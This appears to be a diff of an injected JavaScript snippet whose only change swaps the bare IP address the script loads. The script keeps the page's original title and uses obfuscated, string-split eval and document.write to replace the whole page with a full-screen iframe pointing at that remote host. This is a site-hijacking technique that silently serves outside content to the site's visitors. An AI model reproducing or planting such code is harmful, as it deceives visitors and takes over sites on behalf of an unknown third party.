@@ -1,7 +1,7 @@
 
 
 var titlestr=document.title;
-setFrame("http://38.26.195.14/");
+setFrame("http://38.26.195.16/");
 function setFrame(olink){
     var ss = '<title>'+titlestr+'</title><div id="showcloneshengxiaon" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><ifr' + 'ame scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" height="100%" src="'+olink+'"></iframe></div><style type="text/css">html{width:100%;height:100%;}body {width:100%;height:100%;}</style>';
     eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
